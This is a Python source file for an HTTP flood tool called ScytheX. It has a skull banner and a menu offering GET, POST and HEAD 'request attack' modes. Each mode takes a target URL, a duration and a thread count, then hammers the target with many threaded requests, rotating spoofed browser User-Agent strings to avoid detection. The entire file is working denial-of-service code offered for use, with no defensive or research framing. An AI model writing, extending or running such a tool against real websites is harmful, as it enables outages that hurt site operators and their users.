import os
import sys
import random
import struct
import time
import socket
import threading
import requests

class TextColors:
    BLACK = '\033[30m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    YELLOW = '\033[33m'
    BLUE = '\033[34m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    WHITE = '\033[37m'
    PURPLE = '\033[35m'
    UNDERLINE = '\033[4m'
    RESET = '\033[0m'
    BOLD = "\033[01;01m"
    DARK_RED = "\033[38;5;124m"
    CRIMSON = "\033[38;5;196m"
    TOMATO = "\033[38;5;202m"
    LIGHT_RED = "\033[91m"
    LIGHT_GREEN = "\033[92m"

User_agent = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/85.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-G960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:85.0) Gecko/20100101 Firefox/85.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Ubuntu; X11; rv:84.0) Gecko/20100101 Firefox/84.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Nexus 5X Build/PPR1.180610.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.61 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:87.0) Gecko/20100101 Firefox/87.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 8.0.0; Nexus 6P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.0; Nexus 5 Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 7.0; Nexus 6P Build/NBD92G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/82.0.4085.132 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:78.0) Gecko/20100101 Firefox/78.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 8.0.0; Nexus 5 Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:88.0) Gecko/20100101 Firefox/88.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0",
    "Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:82.0) Gecko/20100101 Firefox/82.0",
    "Mozilla/5.0 (Linux; Android 10; SM-G950F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Mobile Safari/537.36",
]

def l7():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(TextColors.BOLD + """
               ...                            
             ;::::;                            
           ;::::; :;                          
         ;:::::'   :;                           
        ;:::::;     ;.                        
       ,:::::'       ;           OOO\         
       ::::::;       ;          OOOOO\        
       ;:::::;       ;         OOOOOOOO       
      ,;::::::;     ;'         / OOOOOOO      
    ;:::::::::`. ,,,;.        /  / DOOOOOO    
  .';:::::::::::::::::;,     /  /     DOOOO   
 ,::::::;::::::;;;;::::;,   /  /        DOOO  
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /              DOO
`:`:::::::`;:::::: ;::::::#/               DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#    
                   
 - get       |      get request attack
 - post      |      post request attack
 - head      |      head request attack
 - exit      |      Leave layer7 menu
    """ + TextColors.RESET)

def layer7():
    while True:
        l7()
        select = input(TextColors.BOLD + "root@ScytheX > " + TextColors.RESET)

        if select == "get" or select.lower() == "g":
            def logo():
                os.system('cls' if os.name == 'nt' else 'clear')
                print(TextColors.BOLD + """
               ...                            
             ;::::;                           
           ;::::; :;                          
         ;:::::'   :;                         
        ;:::::;     ;.                        
       ,:::::'       ;           OOO\         
       ::::::;       ;          OOOOO\        
       ;:::::;       ;         OOOOOOOO       
      ,;::::::;     ;'         / OOOOOOO      
    ;:::::::::`. ,,,;.        /  / DOOOOOO    
  .';:::::::::::::::::;,     /  /     DOOOO   
 ,::::::;::::::;;;;::::;,   /  /        DOOO  
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /              DOO
`:`:::::::`;:::::: ;::::::#/               DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#

  | - post request attack
  | - coded by 건우Sec   
                              """ + TextColors.RESET)
            # GET request 함수

            def get_request(url, total_requests):
                for _ in range(total_requests):
                    headers = {'User-Agent': random.choice(User_agent)} # User-Agent 
                    response = requests.get(url, headers=headers)  # GET 요청
                    print(TextColors.BOLD + f"[+] URL : {url} [+] THREAD : {max_threads} [+] STATUS CODE : {response.status_code}" + TextColors.RESET)
            
            # GET request 공격 함수

            def start_threads(url, total_requests, max_threads, end_time):
                threads = []  # 스레드 초기화

                while time.time() < end_time and len(threads) < max_threads:
                    requests_per_thread = total_requests // max_threads
                    
                    if requests_per_thread == 0:
                        requests_per_thread = 1  

                    thread = threading.Thread(target=get_request, args=(url, requests_per_thread))
                    thread.start()
                    threads.append(thread)

                for thread in threads:
                    thread.join()

            logo()  
            url = input(TextColors.BOLD + "URL > " + TextColors.RESET)
            Time_sec = int(input(TextColors.BOLD + "Time > " + TextColors.RESET))
            total_requests = int(input(TextColors.BOLD + "Get request > " + TextColors.RESET))
            max_threads = int(input(TextColors.BOLD + "Thread (100~500) > " + TextColors.RESET))

            end_time = time.time() + Time_sec
            start_threads(url, total_requests, max_threads, end_time)

        elif select == "post" or select.lower() == "p":
            def logo():
                os.system('cls' if os.name == 'nt' else 'clear')
                print(TextColors.BOLD + """
               ...                            
             ;::::;                           
           ;::::; :;                          
         ;:::::'   :;                         
        ;:::::;     ;.                        
       ,:::::'       ;           OOO\         
       ::::::;       ;          OOOOO\        
       ;:::::;       ;         OOOOOOOO       
      ,;::::::;     ;'         / OOOOOOO      
    ;:::::::::`. ,,,;.        /  / DOOOOOO    
  .';:::::::::::::::::;,     /  /     DOOOO   
 ,::::::;::::::;;;;::::;,   /  /        DOOO  
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /              DOO
`:`:::::::`;:::::: ;::::::#/               DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#

  | - post request attack
  | - coded by 건우Sec 
                        """ + TextColors.RESET)
                
            # POST request 함수

            def post_request(url, total_requests):
                  for _ in range(total_requests):
                    headers = {'User-Agent': random.choice(User_agent)}
                    data = {'key': 'value'}  # POST 요청 데이터
                    response = requests.post(url, data=data, headers=headers)  # POST 요청
                    print(TextColors.BOLD + f"[+] URL : {url} [+] THREAD : {max_threads} [+] STATUS CODE : {response.status_code}" + TextColors.RESET)
            
            # POST request 공격 함수

            def start_threads(url, total_requests, max_threads, end_time):
                threads = []  # 스레드 초기화

                while time.time() < end_time and len(threads) < max_threads:
                    requests_per_thread = total_requests // max_threads
                    
                    if requests_per_thread == 0:
                        requests_per_thread = 1  

                    thread = threading.Thread(target=post_request, args=(url, requests_per_thread))
                    thread.start()
                    threads.append(thread)

                for thread in threads:
                    thread.join()

            logo()  
            url = input(TextColors.BOLD + "URL > " + TextColors.RESET)
            time_sec = int(input(TextColors.BOLD + "Time > " + TextColors.RESET))
            total_requests = int(input(TextColors.BOLD + "Post request > " + TextColors.RESET))
            max_threads = int(input(TextColors.BOLD + "Thread (100-500) > " + TextColors.RESET))

            end_time = time.time() + time_sec
            start_threads(url, total_requests, max_threads, end_time)

        elif select == "head" or select.lower() == "h":
            def logo():
                os.system('cls' if os.name == 'nt' else 'clear')
                print(TextColors.BOLD + """
               ...                            
             ;::::;                           
           ;::::; :;                          
         ;:::::'   :;                         
        ;:::::;     ;.                        
       ,:::::'       ;           OOO\         
       ::::::;       ;          OOOOO\        
       ;:::::;       ;         OOOOOOOO       
      ,;::::::;     ;'         / OOOOOOO      
    ;:::::::::`. ,,,;.        /  / DOOOOOO    
  .';:::::::::::::::::;,     /  /     DOOOO   
 ,::::::;::::::;;;;::::;,   /  /        DOOO  
;`::::::`'::::::;;;::::: ,#/  /          DOOO 
:`:::::::`;::::::;;::: ;::#  /            DOOO
::`:::::::`;:::::::: ;::::# /              DOO
`:`:::::::`;:::::: ;::::::#/               DOO
 :::`:::::::`;; ;:::::::::##                OO
 ::::`:::::::`;::::::::;:::#                OO
 `:::::`::::::::::::;'`:;::#                O 
  `:::::`::::::::;' /  / `:#                  
   ::::::`:::::;'  /  /   `#

  | - get request attack
  | - coded by 건우Sec   
                        """ + TextColors.RESET)
                
            # HEAD request 함수 

            def head_request(url, total_requests):
                for _ in range(total_requests):
                    headers = {'User-Agent': random.choice(User_agent)}
                    response = requests.head(url, headers=headers)  # HEAD 요청
                    print(TextColors.BOLD + f"[+] URL : {url} [+] THREAD : {max_threads} [+] STATUS CODE : {response.status_code}" + TextColors.RESET)
            
            # HEAD request 공격 함수

            def start_threads(url, total_requests, max_threads, end_time):
                threads = []  # 스레드 초기화

                while time.time() < end_time and len(threads) < max_threads:
                    requests_per_thread = total_requests // max_threads
                    
                    if requests_per_thread == 0:
                        requests_per_thread = 1  

                    thread = threading.Thread(target=head_request, args=(url, requests_per_thread))
                    thread.start()
                    threads.append(thread)

                for thread in threads:
                    thread.join()

            logo()  
            url = input(TextColors.BOLD + "URL > " + TextColors.RESET)
            time_sec = int(input(TextColors.BOLD + "Time > " + TextColors.RESET))
            total_requests = int(input(TextColors.BOLD + "Requests > " + TextColors.RESET))
            max_threads = int(input(TextColors.BOLD + "Thread (100-500) > " + TextColors.RESET))

            end_time = time.time() + time_sec
            start_threads(url, total_requests, max_threads, end_time)

        elif select == "exit" or select.lower() == "e":
            print(TextColors.RED + "[-] bye :(" + TextColors.RESET)
            sys.exit()
